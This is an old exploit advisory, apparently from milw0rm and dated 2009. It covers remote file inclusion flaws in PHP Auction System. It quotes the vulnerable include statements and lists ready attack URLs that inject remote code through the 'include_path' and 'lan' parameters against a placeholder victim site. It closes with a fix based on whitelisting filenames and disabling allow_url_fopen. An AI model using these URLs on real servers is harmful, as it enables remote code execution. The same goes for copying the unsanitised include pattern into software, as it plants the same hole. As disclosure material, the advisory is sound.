<html><head><title>PHPAuctionSystem Multiple Remote File Inclusion Vulnerabilities</title></head><pre>[»]=======================================================================================================[_][-][X]
[»]                                                                             				[»]
[»]      		   PHPAuctionSystem Multiple Remote File Inclusion Vulnerability    			[»]
[»]              				         							[»]
[»]            		 	=======    ------d-------m------     ====    ====   				[»]
[»]             	 	||     =        | |(o o)| |          ||   ||   ||   				[»]
[»]             		||     =          ||(~)||            ||        ||   				[»]
[»]             	 	=======             /|\              ||        ||  				[»]
[»]=============================================================================================================[»]
[»] 				Author         	: ~darkmasking~		 					[»]
[»] 				Date           	: January, 6th 2009           					[»]
[»] 				Web           	: https://www.idsafeshield.com					[»]
[»]           		 	Contact        	: support[at]idsafeshield[dot]com  				[»]
[»]					Critical Level 	: Dangerous			  			[»]
[»]-------------------------------------------------------------------------------------------------------------[»]
[»]              		       Affected software description :        					[»]
[»]   				Software 	: PHP Auction System						[»]
[»]          			Vendor		: http://www.phpauctions.info/					[»]
[»]            			Price 	      	: $59.99							[»]
[»]=============================================================================================================[»]
[»]														[»]
[»]	[~] Vulnerable file											[»]
[»]														[»]
[»]		[+] all file below is affected by &quot;include_path&quot; parameter					[»]
[»]														[»]
[»]		./includes/settings.inc.php									[»]
[»]		$password_file = $include_path.&quot;passwd.inc.php&quot;;						[»]
[»]		include($password_file);									[»]
[»]		include $include_path.&quot;fonts.inc.php&quot;;								[»]
[»]		include $include_path.&quot;fontsize.inc.php&quot;;							[»]
[»]		include($include_path.&quot;currency.inc.php&quot;);							[»]
[»]		include($include_path.&quot;errors.inc.php&quot;);							[»]
[»]		include($include_path.&quot;https.inc.php&quot;);								[»]
[»]														[»]
[»]		./includes/auction_confirmation.inc.php								[»]
[»]		require(&quot;./includes/messages.inc.php&quot;);								[»]
[»]														[»]
[»]		./includes/converter.inc.php									[»]
[»]		include($include_path.&quot;nusoap.php&quot;);								[»]
[»]														[»]
[»]		./includes/messages.inc.php									[»]
[»]		require($include_path.'messages.'.$language.'.inc.php');					[»]
[»]														[»]
[»]		./includes/stats.inc.php									[»]
[»]		include $prefix.&quot;includes/useragent.inc.php&quot;;							[»]
[»]		include $prefix.&quot;includes/domains.inc.php&quot;;							[»]
[»]														[»]
[»]		./includes/useragent.inc.php									[»]
[»]		include $prefix.&quot;includes/browsers.inc.php&quot;;							[»]
[»]		include $prefix.&quot;includes/platforms.inc.php&quot;;							[»]
[»]														[»]
[»]		./includes/user_confirmation.inc.php								[»]
[»]		require(&quot;./includes/messages.inc.php&quot;);								[»]
[»]														[»]
[»]														[»]
[»]		[+] All file below is affected by &quot;lan&quot; parameter						[»]
[»]														[»]
[»]		./browse.php											[»]
[»]		./search.php											[»]
[»]		if(!empty($_GET['lan'])) {									[»]
[»]			$language = $lan;									[»]
[»]			$_SESSION['language'] = $language;							[»]
[»]														[»]
[»]		#// Set language cookie										[»]
[»]			setcookie(&quot;USERLANGUAGE&quot;,$lan,time()+31536000,&quot;/&quot;);					[»]
[»]		} elseif(empty($_SESSION['language']) &amp;&amp; !isset($_COOKIE['USERLANGUAGE'])) {			[»]
[»]			$language = $SETTINGS['defaultlanguage'];						[»]
[»]			$_SESSION['language'] = $language;							[»]
[»]														[»]
[»]		#// Set language cookie										[»]
[»]			setcookie(&quot;USERLANGUAGE&quot;,$language,time()+31536000);					[»]
[»]		} elseif(isset($_COOKIE['USERLANGUAGE'])) {							[»]
[»]			$language = $_COOKIE['USERLANGUAGE'];							[»]
[»]		}												[»]
[»]														[»]
[»]		require($include_path.'messages.'.$language.'.inc.php');					[»]
[»]														[»]
[»]-------------------------------------------------------------------------------------------------------------[»]
[»]														[»]
[»]	[~] Exploit												[»]
[»]														[»]
[»]	[+] &quot;include_path&quot; parameter										[»]
[»]														[»]
[»]	http://www.darkvictims.com/[path]/includes/settings.inc.php?include_path=[darkcode]			[»]
[»]	http://www.darkvictims.com/[path]/includes/auction_confirmation.inc.php?include_path=[darkcode]		[»]
[»]	http://www.darkvictims.com/[path]/includes/converter.inc.php?include_path=[darkcode]			[»]
[»]	http://www.darkvictims.com/[path]/includes/messages.inc.php?include_path=[darkcode]			[»]
[»]	http://www.darkvictims.com/[path]/includes/stats.inc.php?include_path=[darkcode]			[»]
[»]	http://www.darkvictims.com/[path]/includes/useragent.inc.php?include_path=[darkcode]			[»]
[»]	http://www.darkvictims.com/[path]/includes/user_confirmation.inc.php?include_path=[darkcode]		[»]
[»]														[»]
[»]														[»]
[»]	[+] &quot;lan&quot; parameter											[»]
[»]														[»]
[»]	http://www.darkvictims.com/[path]/browse.php?lan=[darkcode]						[»]
[»]	http://www.darkvictims.com/[path]/search.php?lan=[darkcode]						[»]
[»]														[»]
[»]-------------------------------------------------------------------------------------------------------------[»]
[»]														[»]
[»] 	[~] How to fix this vulnerability									[»]
[»]														[»]
[»]    	Edit the source code to ensure that input is properly validated. Where is possible, 			[»]
[»]    	it is recommended to make a list of accepted filenames and restrict the input to that list.		[»]
[»]														[»]
[»]    	For PHP, the option allow_url_fopen would normally allow a programmer to open, 				[»]
[»]    	include or otherwise use a remote file using a URL rather than a local file path. 			[»]
[»]    	It is recommended to disable this option from php.ini.							[»]
[»]														[»]
[»]-------------------------------------------------------------------------------------------------------------[»]
[»]														[»]
[»]	[~] Greetz												[»]
[»]														[»]
[»]	BUAT DIRI SENDIRI AJA [ Sorry Bro belum dapat teman :) ]						[»]
[»]														[»]
[»]														[»]
[»]=============================================================================================================[»]

# milw0rm.com [2009-01-06]</pre></html>